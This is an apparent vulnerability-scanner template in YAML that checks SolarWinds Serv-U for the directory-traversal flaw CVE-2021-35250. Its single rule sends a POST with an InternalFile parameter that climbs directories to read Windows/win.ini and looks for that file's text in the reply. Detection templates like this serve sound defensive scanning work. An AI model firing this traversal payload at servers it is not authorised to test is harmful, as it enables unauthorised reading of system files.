name: yaml-poc-solarwinds-serv-u-directory_traversal-CVE-2021-35250
binding: a85e2b5e-6a11-4889-a7a1-86a0ca55dcd4
detail:
    author: jiapeng.han
    links:
        - https://cxsecurity.com/cveshow/CVE-2021-35250/
        - https://nvd.nist.gov/vuln/detail/CVE-2021-35250
        - https://support.solarwinds.com/SuccessCenter/s/article/Serv-U-15-3-HotFix-1?language=en_US
        - https://www.cybersecurity-help.cz/vdb/SB2022030306
        - https://www.solarwinds.com/trust-center/security-advisories/cve-2021-35250
    vulnerability:
        id: 5b5a0046-e23e-4654-9541-db5e6b0e4475
        level: high
    warning: Harmless
transport: http
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /?Command=NOOP&InternalFile=../../../../../../../../../../../../../../Windows/win.ini&NewWebClient=1
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: /?Command=NOOP
            follow_redirects: false
        expression: response.status == 401 && response.body_string.contains("for 16-bit app support")
expression: r0()
